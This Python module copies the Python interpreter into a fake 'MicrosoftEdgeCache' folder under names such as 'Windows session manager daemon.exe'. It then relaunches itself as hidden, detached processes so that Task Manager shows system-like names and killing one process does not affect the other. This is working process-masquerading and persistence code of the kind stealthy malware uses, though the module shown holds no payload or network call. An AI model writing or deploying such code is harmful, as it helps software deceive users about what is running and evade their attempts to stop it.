r"""
# Launcher renaming

What makes Task Manager show the right process name.

Task Manager's **Name** column comes from the *image file name* of the
process — not from the PEB (which is what the old trick rewrote).  The only
reliable way to show a different name is to run the process from a file that
actually has that name.

So on first launch we copy `pythonw.exe` into:

    %LOCALAPPDATA%\MicrosoftEdgeCache\lions_heart.exe
    %LOCALAPPDATA%\MicrosoftEdgeCache\Windows session manager daemon.exe

and re-execute ourselves from those copies.

Because every process is launched with
`DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP`, the two are not grouped in
Task Manager and killing one does not affect the other.

`python_env()` fixes up `PATH` / `PYTHONHOME` so the copied interpreter — which
lives outside its installation directory — can still find `python3XX.dll`,
`python3.dll` and the standard library.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
import tempfile

from config import CACHE_DIR_NAME, CREATE_NEW_PROCESS_GROUP, DETACHED_PROCESS
from log import log


def pythonw() -> str:
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        candidate = exe[: -len("python.exe")] + "pythonw.exe"
        if os.path.exists(candidate):
            return candidate
    return exe


def cache_dir() -> str:
    d = os.path.join(
        os.environ.get("LOCALAPPDATA", tempfile.gettempdir()),
        CACHE_DIR_NAME,
    )
    os.makedirs(d, exist_ok=True)
    return d


def launcher(target_name: str) -> str:
    target = os.path.join(cache_dir(), f"{target_name}.exe")
    if os.path.exists(target):
        return target
    try:
        shutil.copy2(pythonw(), target)
        log(f"Created launcher: {target}")
    except Exception as exc:
        log(f"Could not create launcher copy: {exc!r}")
        return pythonw()
    return target


def python_env() -> dict:
    env = os.environ.copy()
    py_dir = os.path.dirname(pythonw())
    extra = [py_dir, os.path.join(py_dir, "DLLs"), sys.base_prefix]
    env["PATH"] = os.pathsep.join(extra) + os.pathsep + env.get("PATH", "")
    env["PYTHONHOME"] = sys.base_prefix
    return env


def spawn(exe: str, args: list[str]) -> subprocess.Popen:
    return subprocess.Popen(
        [exe] + args,
        env=python_env(),
        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
        close_fds=True,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
